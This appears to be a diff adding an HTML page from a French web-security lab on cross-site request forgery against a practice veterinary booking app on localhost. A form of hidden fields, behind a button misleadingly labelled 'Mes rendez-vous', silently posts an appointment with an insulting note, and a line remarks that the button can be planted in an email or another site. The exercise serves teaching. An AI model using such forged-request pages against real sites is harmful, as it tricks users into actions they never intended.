@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8">
+        <title>
+            attaque - CSRF
+        </title>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">     
+    </head>
+    <body>
+        <div class="container p-3 my-3 border">
+
+            <h2>VetoPlan - attaque CSRF</h2>
+            <!-- adapter le formulaire en mettant votre login dans l'URL -->
+            <form action="http://localhost/cours/ldfx/bloc3/td-csrf/VetoPlan/index.php?action=addrdv" method="POST">
+                <input type="hidden" name="idC" value="5" />
+                <input type="hidden" name="date" value="2030-03-26" />
+                <input type="hidden" name="heure" value="09:23" />
+                <input type="hidden" name="rueR" value="" />
+                <input type="hidden" name="cpR" value="" />
+                <input type="hidden" name="villeR" value="" />
+                <input type="hidden" name="animalR" value="" />
+                <input type="hidden" name="notes" value="injure" />
+               <input  class="btn btn-primary" type="submit" value="Mes rendez-vous" /> 
+            </form>
+            ce bouton peuvent être déployés dans un mail, un autre site
+        </div>
+    </body>
+</html>
